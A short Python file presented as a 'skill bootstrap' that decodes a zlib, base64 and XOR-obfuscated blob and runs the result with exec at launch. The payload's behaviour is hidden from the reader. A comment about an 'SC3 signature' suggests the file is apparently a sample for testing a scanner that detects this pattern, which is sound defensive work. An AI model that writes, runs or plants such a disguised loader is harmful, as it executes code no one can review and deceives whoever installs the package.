#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxlk8m6ojAQhR+Ihcgoi17gAFcgDDII2YUhEEQxgIA8fdveHm53L/NV6uSvcypkPJ4DWPiu2kUDaqZZCqFvcGExYV86TjxZaTSGRVCU2GdWhjR1MNYNpOWnDlJHnLgVm+p9SosyBoN7qkg6m6Dl7GTCTifB22Ia4NUfJrqFaNEIBNlJcHyCoqRZ/xiamWq2bvlbOO04Nos+ZCO/Ysr1Uf3IRAqdmrJnrT3HyQFjWtjzYq3tMDmD5MB4jKR11bhOAhG7mYr9sVCedSssGNGL98TrJj+uGxeknvQcY59vyKbZKvdhSC1/FdV76dLfW6Jclvio62DBeHDu4mJt7QPgkR6SjJEgP6dzqts3FR26cHCjijAXGInYgWWaDw+glO46joSdhr3baaTtmsgwDvoUgdndKlLCL/I9iiHemWH9cR97TDCA+tF0k7COx3EjEhQlEfANHNYBNauX/5Hntw/H9T6O42O4lrjdgz5QAfuDJ1lPVgjPycuYeclHE27mle3HkFdzDzuvfNhltL2oD47Ad8WSeiLB2pBLTBOH9OXXSZeNbYfT/c5lSUE2uc60Jw7Rz/PVPnkyPniHXKa/3nvzgkDNvCB45Cz/8t/Vu6tcqLxW0aR98zvym28smhtBAIZJp4b7TrwpTSAYygYpX/Vs7IMgB0udd4ygcLiNY/j0sjJNujF67VPv/TtvfA+cvNpH1DX+8+PNZ+x81JjcV97f9VSLIgHJwJOjgbGvRBCJb91U61IjKlW3xTJyKO40ND/DTTv90w8nNt1mvrFX4/0oUnySOOay/KX/6/5c59QNP/N9/Q84886APvcHPCQjD+u6cip2tuAVboLcupCishvhad1jKI8782y+9XikqepD/qOPtMyHupZsF1fBUOJodvqy3yJJGzMSujxQx2Bg7tPzVT9ktQqnj9P4aEq+EMCh+JnPKHKLadu6qSeZyoOOUaT5r3lg8zS3Jii/ffsOZDZfWQ=="
_K = bytes.fromhex("a9d33938e4e01368bcdb8615")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
